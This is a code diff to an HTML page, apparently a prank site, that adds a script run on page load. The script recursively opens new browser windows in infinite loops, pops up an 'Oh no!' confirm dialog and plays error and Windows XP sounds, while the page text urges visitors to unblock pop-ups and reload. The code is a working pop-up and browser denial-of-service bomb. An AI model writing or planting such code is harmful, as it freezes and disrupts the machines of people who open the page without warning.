@@ -6,10 +6,23 @@
     var error = new Audio('https://www.myinstants.com/media/sounds/erro.mp3');
     var xp = new Audio ('https://www.winhistory.de/more/winstart/mp3/winxp.mp3');
     function infiny() {
-        for (var i=0; i<Infinity; i++) {
+        open("https://hooman1130.github.io/js/open.html");
+        if (confirm("Oh no!")) {
             open("https://hooman1130.github.io/js/open.html");
-            infiny();
+            error.play();
+            xp.play();
+        } else {
+            open("https://hooman1130.github.io/js/open.html");
+            error.play();
+            xp.play();
         }
+        for (var i=0; i<Infinity; i++) {
+            infiny();
+            open("https://hooman1130.github.io/js/open.html");
+        }
+    }
+    for (var i=0; i<Infinity; i++) {
+        infiny();
     }
 </script>
 <body>Make sure pop-ups are not blocked, then reload.</body>
